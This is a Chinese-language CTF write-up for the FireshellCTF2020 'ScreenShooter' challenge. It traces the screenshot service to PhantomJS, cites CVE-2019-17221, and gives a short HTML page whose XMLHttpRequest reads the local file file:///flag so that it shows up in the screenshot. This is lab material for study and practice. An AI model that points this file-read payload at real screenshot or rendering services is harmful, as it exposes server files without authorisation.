---
title: '[FireshellCTF2020]ScreenShooter'
date: 2025-02-01 20:20:31
tags: 
      - PhantomJS漏洞
      - 漏洞
categories: 刷题笔记
---

## [FireshellCTF2020]ScreenShooter

![image-20250202205207922](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022052956.png)

如图所示，这是一个url提交框，当我们提交url时，会对网页进行截图

所以我们需要检测该网页发送的流量

我们使用https://beeceptor.com/来检测流量

我们先生成一个域名进行提交

![image-20250202205509963](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022055172.png)

然后我们在网页查看请求头，注意使用http头，不然很难看到请求头

![image-20250202210334037](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022103081.png)

我们注意到PhantomJS

![image-20250202210401153](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022104281.png)

在[NVD - CVE-2019-17221 (nist.gov)](https://nvd.nist.gov/vuln/detail/CVE-2019-17221)存在漏洞

![image-20250202210450538](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022104657.png)

我们注意其中的`攻击者可借助特制的HTML文件利用该漏洞读取文件系统上任意文件`

可以使用`file:// URI 的 XMLHttpRequest`读取文件（好像过滤了，我们使用http来读取）

编写一个index.html放在自己的vps的/var/www/html/文件夹里

```
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
	<script type="text/javascript">
		var karsa;
		karsa = new XMLHttpRequest;
		karsa.onload = function(){
			document.write(this.responseText)
		};
		karsa.open("GET","file:///flag");
		karsa.send();
	</script>
</body>
</html>
```

得到flag

![image-20250202211330699](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022113810.png)
